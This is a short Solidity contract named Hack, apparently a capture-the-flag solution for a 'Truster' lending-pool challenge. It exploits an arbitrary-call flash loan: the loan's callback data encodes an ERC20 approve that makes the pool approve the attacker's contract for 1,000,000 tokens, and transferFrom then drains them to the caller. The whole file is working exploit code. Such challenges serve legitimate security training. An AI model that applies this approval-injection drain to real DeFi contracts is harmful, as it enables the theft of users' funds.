// SPDX-License-Identifier: UNLICENSED
// This is non-open-source code. We do not allow other people to use this AMZING code.

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./TrusterLenderPool.sol";

contract Hack {
    constructor (
        uint256 borrowAmount,
        address pool,
        address token
    ) {
        // function approve(address spender, uint256 amount)
        // 0x095ea7b3 = KECCAK(256, "approve(address,uint256)")[:4]
        bytes memory data = abi.encodeWithSelector(bytes4(0x095ea7b3), address(this), 0xd3c21bcecceda1000000);
        TrusterLenderPool(pool).flashLoan(borrowAmount, pool, token, data);
        
        ERC20(token).transferFrom(pool, msg.sender, 0xd3c21bcecceda1000000);
    }
}
